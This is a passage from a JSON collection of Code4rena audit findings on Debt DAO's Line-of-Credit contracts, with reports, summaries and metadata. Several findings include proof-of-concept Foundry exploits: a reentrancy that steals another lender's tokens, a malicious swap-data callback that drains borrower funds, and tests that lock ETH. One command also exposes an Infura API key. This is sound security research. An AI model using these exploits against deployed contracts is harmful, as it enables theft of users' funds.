line.borrow(id_first, lenderOneAmount);\n        vm.stopPrank();\n        \n        // Borrowers adds an additional credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed), address(lender2));\n        vm.stopPrank();\n\n        // Lender2 adds an additional credit line from  \n        vm.startPrank(lender2);\n        tokenUsed.approve(address(line), lenderTwoAmount);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed),  address(lender2));\n        vm.stopPrank();\n\n        // repay all debt to lender 1\n        vm.startPrank(borrower);\n        tokenUsed.approve(address(line), lenderOneAmount);\n        line.depositAndRepay(lenderOneAmount);\n        line.close(id_first);\n        vm.stopPrank();\n        \n        //validate that lender1 was able to steal lender2 tokens\n        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);\n    }\n```\n\nTo run the POC execute:\n`forge test -v`\n\nExpected output:\n\n    [PASS] test_reentrancy() (gas: 1636410)\n    Test result: ok. 1 passed; 0 failed; finished in 1.71ms\n\nTo get full trace execute:\n`forge test -vvvv`\n\n### Tools Used\n\nVS Code, Foundry.\n\n### Recommended Mitigation Steps\n\nSend tokens only at the end of `_close(Credit memory credit, bytes32 id)` or add a reentrancyGuard.\n\n**[kibagateaux (Debt DAO) disputed and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1332394657):**\n > Similar comments to [#176](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176). Both Lenders would have to agree to use tokens that have inherent reentrancy attacks built into the token. This issue feels much more valid than the other one.\n> \n> In my opinion its not valid to say \"if you add malicious things, malicious things happen\". If I didn't want token reentrancy attacks, I simply wouldn't add tokens with explicit arbitrary reentrancy abilities.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1340012972):**\n> That line of reasoning doesn't hold up. The user should be protected against accidentally allowing a token that has a reentrancy attack vector. There is not an immediate and obvious difference between ERC777 and ERC20 tokens. This issue has been a viable Medium risk going all the way back to Uniswap V2 (or possibly before).\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the LineOfCredit.sol contract, which is part of the Line-of-Credit project on Github. This bug allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds). This is due to a reentrancy bug in the `_close(credit, id)` function. The `credit[id]` state variable is cleared only after sending tokens to the lender, meaning a lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`.\n\nTo demonstrate this bug, a Proof of Concept (POC) was created using the MockLender.sol and Token777.sol contracts. This POC shows that if a borrower adds a new credit with lender1 on 1000 tokens, then lends 1000 from lender1, repays debt, adds a new credit with lender2 on 1000 tokens, and closes debt with lender1, lender1 will receive 2000 tokens.\n\nThe tools used to create the POC were VS Code and Foundry. The recommended mitigation steps are to either send tokens only at the end of `_close(Credit memory credit, bytes32 id)` or to add a reentrancyGuard.",
      "quality_score": 5,
      "rarity_score": 3.3333333333333335,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/160",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "0xdeadbeef0x",
        "joestakey",
        "hansfriese",
        "SmartSek"
      ]
    },
    {
      "id": "6244",
      "title": "[M-04] Lender can trade claimToken in a malicious way to steal the borrower’s money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85\n\n\n## Vulnerability details\n\n## Impact\n\nLender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData.\n\nIn the design of the protocol, the lender can use the function claimAndRepay(), the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit. \n\n```\nfunction claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external\n        whileBorrowing\n        nonReentrant\n        returns (uint256) { \n\n...\n// Line 106 - Line 112\nuint256 newTokens = claimToken == credit.token ?\n          spigot.claimEscrow(claimToken) :  // same asset. dont trade\n          _claimAndTrade(                   // trade revenue token for debt obligation\n              claimToken,\n              credit.token,\n              zeroExTradeData\n          );\n...\n// Line 128 - Line 130 \n credits[id] = _repay(credit, id, repaid);\n\n        emit RevenuePayment(claimToken, repaid);\n\n...\n\n}\n\n```\n\n```\nfunction _claimAndTrade(\n      address claimToken,\n      address targetToken,\n      bytes calldata zeroExTradeData\n    )\n        internal\n        returns (uint256)\n    {\n        (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(\n            claimToken,\n            targetToken,\n            swapTarget,\n            address(spigot),\n            unusedTokens[claimToken],\n            zeroExTradeData\n        );\n\n        // we dont use revenue after this so can store now\n        unusedTokens[claimToken] = totalUnused;\n        return tokensBought;\n    }\n```\n```\nfunction claimAndTrade(\n        address claimToken,\n        address targetToken,\n        address payable swapTarget,\n        address spigot,\n        uint256 unused,\n        bytes calldata zeroExTradeData\n    )\n    external \n        returns(uint256, uint256)\n\n{\n...\n trade(\n            claimed + unused,\n            claimToken,\n            swapTarget,\n            zeroExTradeData\n        );\n        \n        // underflow revert ensures we have more tokens than we started with\n        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;\n\n        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n...\n\n\n}\n\n```\n\nIn the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert. \n\nThe bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.\n\n## Proof of Concept\n\nThe following code can manipulate and bypass the check to steal money of the borrower.\nStep 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract. \nStep 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit. \n\n```\nreceive() external payable {\n    console.log(\"Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\");\n    uint256 amount = 100; \n    creditToken.transfer(address(line),amount);\n    console.log(\"Receive the amount of ETH: %s\", msg.value);\n  }\n\n```\nIn the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check \n```\n if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought\n```\nSince this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken. \n\nThis amount then will be used to repay the credit. \nSo this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.\n\nIn the zip file in the Google_Drive link, there is the POC written for this bug. \nThe test case is test_lender_can_claim_and_repay_3 in file SpigotedLine.t.modified.sol \nYou can put this file to the tests folder\nhttps://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing\n\nYou can run the POC by calling: \n```\nforge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\number 15918000\n```\nHere I use the block-number to make the test log stable, but this does not impact the logic of POC. \n\nYou can find the detailed log file: Line-of-Credit\\test_claim_221107_2311.log\nThe full log file here: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing \nIn this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower. \n\nLogs:\n  Step 0: As a Borrower borrow some money \n  Step 1: Construct the tradeData to call claimAndRepay as the lender\n  claimed: 1000000000000000000000\n  unused: 0\n  sellAmount: 1000000000000000000000\n  Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData\n  Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\n  Receive the amount of ETH: 632428006785336734\n  emit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)\n  emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)\n  RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)\n\nYou can use the POC.patch here: https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing \nTo use it use command \n```\ngit apply POC.patch\n\n```\n\nTo run use command \n```\nforge install\nforge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n\number 15918000\n\n```\n\nThe full code repository: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing \n\n## Tools Used\nFoundry\n\n## Recommended Mitigation Steps\n\nThis is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.",
      "summary": "\nThis bug report is about a vulnerability found in the Line-of-Credit protocol, which is an Ethereum-based lending protocol. The vulnerability allows a lender to take advantage of the claimAndRepay() function by using malicious zeroExTradeData to steal the borrower's money. \n\nThe bug occurs when the lender uses the claimAndRepay() function to take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit. In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert. The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.\n\nThe proof of concept code manipulates and bypasses the check to steal money of the borrower. Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract. Step 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit. In the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check. This amount then will be used to repay the credit, resulting in the borrower losing money.\n\nThe recommended mitigation steps are to limit this functionality for the borrower to use, as the borrower will not benefit from stealing his own money.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/110",
      "tags": [
        "Bypass limit",
        "0x"
      ],
      "finders": [
        "Trust",
        "0x52",
        "cccz",
        "minhquanym",
        "perseverancesuccess",
        "Lambda",
        "HE1M",
        "adriro",
        "aphak5010"
      ]
    },
    {
      "id": "6243",
      "title": "[M-03] Borrower/Lender excessive ETH not refunded and permanently locked in protocol",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388>\n\n### Impact\n\nThe protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting. As a result, the funds are permanently locked in the protocol **(Loss of funds)**.\n\nThere are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.\n\nThe vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. **There is no way to transfer the locked ETH back to the users**, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).\n\nThis vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine.\n\n### Proof of Concept\n\nThe bug resides in `receiveTokenOrETH` function when receiving ETH.\n\nThe function does not handle cases where `msg.value` is larger than `amount` meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59>\n\n      function receiveTokenOrETH(\n          address token,\n          address sender,\n          uint256 amount\n        )\n          external\n          returns (bool)\n        {\n            if(token == address(0)) { revert TransferFailed(); }\n            if(token != Denominations.ETH) { // ERC20\n                IERC20(token).safeTransferFrom(sender, address(this), amount);\n            } else { // ETH\n                if(msg.value < amount) { revert TransferFailed(); }\n            }\n            return true;\n        }\n\nScenarios where borrowers ETH funds will be locked in LineOfCredit:\n\n1.  Borrower calls `depositAndClose` with an ETH value that is above the owed debt.\n2.  Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters.\n3.  Borrower calls `close` with an ETH value that is above the owed fees.\n\nScenarios where lenders ETH funds will be locked in LineOfCredit:\n\n1.  Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter.\n2.  Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.\n\nThe above scenarios will happen when:\n\n*   Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake.\n*   Excessive ETH will be sent (and expected to be refunded) when calling `depositeAndClose()`, `close(id)` and `depositAndRepay(amount)` as they internally update the fees with the `_accrue` method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.\n    *   The formula that calculates interest:\n\n`InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR + \n(rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR`<br>\nWhere `timespan` is `timespan= block.timestamp - rate.lastAccrued`<br>\n    *   Attached link to Debt DAO docs with more information: <https://docs.debtdao.finance/faq/accrued-interest-calculation>\n\nThe POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute `forge test -v`. Expected output:\n\n    Running 4 tests for contracts/tests/LineOfCredit.t.sol:LineTest\n    [PASS] test_freeze_eth_addCredit() (gas: 277920)\n    [PASS] test_freeze_eth_depositAndClose() (gas: 280378)\n    [PASS] test_freeze_eth_depositAndRepay() (gas: 302991)\n    [PASS] test_freeze_eth_increaseCredit() (gas: 318830)\n    Test result: ok. 4 passed; 0 failed; finished in 1.59ms\n\nAdd the following code to tests:\n\n        function _addCreditEth(address token, uint256 amount) internal {\n            vm.prank(borrower);\n            line.addCredit(dRate, fRate, amount, token, lender);\n            vm.stopPrank();\n            vm.prank(lender);\n            line.addCredit{value: amount}(dRate, fRate, amount, token, lender);\n            vm.stopPrank();\n        }\n        function test_freeze_eth_depositAndClose() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            _addCreditEth(eth, amount);\n\n            //borrow 1 ether\n            bytes32 id = line.ids(0);\n            vm.startPrank(borrower);\n            line.borrow(id, amount);\n            vm.stopPrank();\n            \n            //depositAndClose full extra funds (amount * 2)\n            vm.startPrank(borrower);\n            line.depositAndClose{value:amount*2}();\n            vm.stopPrank();\n\n            //validate funds are stuck\n            console.log(address(line).balance);\n            assert(address(line).balance == amount*2 - amount);\n        }\n\n         function test_freeze_eth_depositAndRepay() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            _addCreditEth(eth, amount);\n\n            //borrow 1 ether\n            bytes32 id = line.ids(0);\n            vm.startPrank(borrower);\n            line.borrow(id, amount);\n            vm.stopPrank();\n            \n            //depositAndRepay full extra funds (amount * 2)\n            vm.startPrank(borrower);\n            line.depositAndRepay{value:amount*2}(amount);\n            vm.stopPrank();\n\n\n            // Lender calls withdraw \n            vm.startPrank(lender);\n            line.withdraw(id, amount);\n            vm.stopPrank();\n\n            //validate funds are stuck\n            assert(address(line).balance == amount*2 - amount);\n        }\n\n        function test_freeze_eth_addCredit() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            vm.prank(borrower);\n            line.addCredit(dRate, fRate, amount, eth, lender);\n            vm.stopPrank();\n            vm.prank(lender);\n            //double msg.value then amount\n            line.addCredit{value: amount*2}(dRate, fRate, amount, eth, lender);\n            vm.stopPrank();\n\n            //borrow 1 ether\n            bytes32 id = line.ids(0);\n            vm.startPrank(borrower);\n            line.borrow(id, amount);\n            vm.stopPrank();\n            \n            //depositAndClose full extra funds (amount)\n            vm.startPrank(borrower);\n            line.depositAndClose{value:amount}();\n            vm.stopPrank();\n\n            //validate funds are stuck\n            assert(address(line).balance == amount*2 - amount);\n        }\n\n        function test_freeze_eth_increaseCredit() public {\n            uint256 amount = 1 ether;\n            address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\n\n            // fund lender\n            deal(lender, amount*5);\n            // fund borrower\n            deal(borrower, amount*5);\n\n            // add credit to line\n            _addCreditEth(eth, amount);\n            \n            // get id\n            bytes32 id = line.ids(0);\n\n            // increase credit to line\n            vm.prank(borrower);\n            line.increaseCredit(id, amount);\n            vm.stopPrank();\n            vm.prank(lender);\n            //double msg.value then amount\n            line.increaseCredit{value:amount*2}(id, amount);\n            vm.stopPrank();\n\n            //total amount * 3 in contract\n\n            //borrow 2 ether\n            vm.startPrank(borrower);\n            line.borrow(id, amount * 2);\n            vm.stopPrank();\n            \n            //depositAndClose full extra funds (amount)\n            vm.startPrank(borrower);\n            line.depositAndClose{value:amount*2}();\n            vm.stopPrank();\n\n            //validate funds are stuck\n            assert(address(line).balance == amount*3 - amount*2);\n        }\n\nThe POC demonstrates how Borrower and Lender funds get locked in the protocol.\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\nOptions:\n\n1.  refund - in receiveTokenOrETH, refund tokens back to ` msg.sender  `if `msg.value > amount`\n2.  revert - change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction.\n\n**[dmvt (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/39#issuecomment-1339519753):**\n > This has been rated Medium because it requires that the borrower or lender send too much ETH in the first place (external factor). Great report quality!\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/39#issuecomment-1405075453)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Line of Credit protocol, which does not refund overpayment of ETH. This means that excessive ETH is not included in the protocol's accounting, resulting in the funds being permanently locked in the protocol (Loss of funds). This vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine, and affects at least five different scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol. \n\nThe bug resides in the `receiveTokenOrETH` function when receiving ETH. This function does not handle cases where `msg.value` is larger than `amount`, meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. This results in the excessive ETH being permanently locked in the contract, as the withdraw methods are dependent on the internal accounting. \n\nThe scenarios where borrowers ETH funds will be locked in LineOfCredit include: \n1. Borrower calls `depositAndClose` with an ETH value that is above the owed debt.\n2. Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters.\n3. Borrower calls `close` with an ETH value that is above the owed fees.\n\nThe scenarios where lenders ETH funds will be locked in LineOfCredit include:\n1. Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter.\n2. Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.\n\nThe POC demonstrates how Borrower and Lender funds get locked in the protocol. It includes four of the mentioned scenarios and can be added to the LineOfCredit.t.sol test and executed using `forge test -v`.\n\nThe recommended mitigation steps are to either refund the tokens back to `msg.sender `if `msg.value > amount`, or change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction. \n\nTools used to investigate this bug include VS Code and Foundry.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/39",
      "tags": [
        "Refund Ether"
      ],
      "finders": [
        "codexploder",
        "Nyx",
        "brgltd",
        "berndartmueller",
        "HE1M",
        "Ch_301",
        "eierina",
        "Trust",
        "rbserver",
        "minhquanym",
        "joestakey",
        "Lambda",
        "adriro",
        "Tomo",
        "aphak5010",
        "perseverancesuccess",
        "d3e4",
        "immeas",
        "cccz",
        "Koolex",
        "Ruhum",
        "0xdeadbeef0x",
        "8olidity",
        "eighty",
        "RedOneN",
        "ayeslick",
        "carlitox477",
        "lotux",
        "rvierdiiev"
      ]
    },
    {
      "id": "6242",
      "title": "[M-02] Mutual consent cannot be revoked and stays valid forever",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262>\n\n### Impact\n\nContracts that inherit from the `MutualConsent` contract, have access to a `mutualConsent` modifier.\n\nFunctions that use this modifier need consent from two parties to be called successfully.\n\nOnce one party has given consent for a function call, it cannot revoke consent.\n\nThis means that the other party can call this function at any time now.\n\nThis opens the door for several exploitation paths.\n\nMost notably though the functions `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` can cause problems.\n\nOne party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.\n\n### Proof of Concept\n\n1.  A borrower and lender want to change the rates for a credit.\n    The borrower wants to create the possibility for himself to change the rates in the future without the lender's consent.\n2.  The borrower and lender agree to set `dRate` and `fRate` to 5%.\n3.  The lender calls the `LineOfCredit.setRates()` function to give his consent.\n4.  The borrower might now say to the lender \"Let's put the rate to 5.1% instead, I will give an extra 0.1%\"\n5.  The borrower and lender now both call the `LineOfCredit.setRates()` function to set the rates to 5.1%.\n6.  The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules) and at some point the borrower can decide to set the rates to 5%.\n\nLinks:\n\n`MutualConsent` contract: <https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol>\n\n`LineOfCredit.setRates()` function: <https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThere are several options to fix this issue:\n\n1.  Add a function to the `MutualConsent` contract to revoke consent for a function call.\n2.  Make consent valid only for a certain amount of time.\n3.  Invalidate existing consents for a function when function is called with different arguments.\n\nOption 3 requires a lot of additional bookkeeping but is probably the cleanest solution.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/33)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `MutualConsent` contract. This contract is used in the Line-of-Credit project and has a modifier called `mutualConsent`. This modifier is used to require consent from two parties before a function can be called. The issue is that once one party has given consent, they cannot revoke it. This can lead to exploitation paths, most notably with the `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` functions.\n\nFor example, one party can use social engineering to make the other party consent to multiple function calls and exploit the multiple consents. This is illustrated in the proof of concept provided in the report.\n\nThe recommended mitigation steps are to add a function to revoke consent, make consent valid only for a certain amount of time, or invalidate existing consents when a function is called with different arguments. The latter requires additional bookkeeping but is the cleanest solution.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/33",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Jeiwan",
        "minhquanym",
        "HE1M",
        "hansfriese",
        "SmartSek",
        "rvierdiiev",
        "aphak5010"
      ]
    },
    {
      "id": "6241",
      "title": "[M-01] Borrower can by mistake add own money to credit if credit is in ETH",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244>\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74>\n\n### Impact\n\nBorrower can mistakenly add own money to credit if credit is in ETH.\n\n### Proof of Concept\n\nFunction `LineOfCredit.addCredit` is used to create new credit.\n\nIt can be called only after contest of another party.\n\n```solidity\n    function addCredit(\n        uint128 drate,\n        uint128 frate,\n        uint256 amount,\n        address token,\n        address lender\n    )\n        external\n        payable\n        override\n        whileActive\n        mutualConsent(lender, borrower)\n        returns (bytes32)\n    {\n        LineLib.receiveTokenOrETH(token, lender, amount);\n\n\n        bytes32 id = _createCredit(lender, token, amount);\n\n\n        require(interestRate.setRate(id, drate, frate));\n        \n        return id;\n    }\n```\n\n`LineLib.receiveTokenOrETH(token, lender, amount)` is responsible for getting payment.\n\n<https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74>\n\n```solidity\n    function receiveTokenOrETH(\n      address token,\n      address sender,\n      uint256 amount\n    )\n      external\n      returns (bool)\n    {\n        if(token == address(0)) { revert TransferFailed(); }\n        if(token != Denominations.ETH) { // ERC20\n            IERC20(token).safeTransferFrom(sender, address(this), amount);\n        } else { // ETH\n            if(msg.value < amount) { revert TransferFailed(); }\n        }\n        return true;\n    }\n```\n\nAs you can see in case of native token payment, `sender` is not checked to be `msg.sender`, so this makes it's possible that borrower can mistakenly pay instead of lender. It sounds funny, but it's possible. What is needed is for the lender to call `addCredit` first and then borrower calls `addCredit` and provides value.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nCheck that if payment in ETH, then `lender == msg.sender` in `addCredit` function.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/24)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LineOfCredit smart contract, which is part of the Line-of-Credit project. The vulnerability allows a borrower to mistakenly add their own money to a line of credit if the credit is in ETH. The vulnerability is found in the addCredit function, which can be called only after consent from another party. The function LineLib.receiveTokenOrETH is responsible for getting the payment, and does not check that the sender is the same as the msg.sender, meaning that the borrower can mistakenly pay instead of the lender. The recommended mitigation step is to check that the lender is the same as the msg.sender in the addCredit function when the payment is in ETH.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/24",
      "tags": [
        "Validation"
      ],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "6240",
      "title": "[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation",
      "impact": "HIGH",
      "content": "\nA borrower can repay (parts) of a credit line with the `SpigotedLine.useAndRepay` function. This function will use `amount` of `unusedTokens[credit.token]` as a repayment. However, if `amount` exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number.\n\nThis a problem because a borrower can unknowingly provide a larger than necessary `amount` to the `SpigotedLine.useAndRepay` function to make sure enough funds are used to fully repay the principal and the remaining interest.\n\nAdditionally, a lender can do the same thing as the lender can call this function.\n\n### Impact\n\nThe `credit.principal` underflows without an error and will be set to a very large number. This will force a secured line **immediately** into liquidation. Additionally, having a principal value close to `2^256 - 1` will make it hugely expensive to repay the credit line.\n\n### Proof of Concept\n\n[utils/CreditLib.sol#L186](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186)\n\n```solidity\nfunction repay(\n  ILineOfCredit.Credit memory credit,\n  bytes32 id,\n  uint256 amount\n)\n  external\n  returns (ILineOfCredit.Credit memory)\n{ unchecked {\n    if (amount <= credit.interestAccrued) {\n        credit.interestAccrued -= amount;\n        credit.interestRepaid += amount;\n        emit RepayInterest(id, amount);\n        return credit;\n    } else {\n        uint256 interest = credit.interestAccrued;\n        uint256 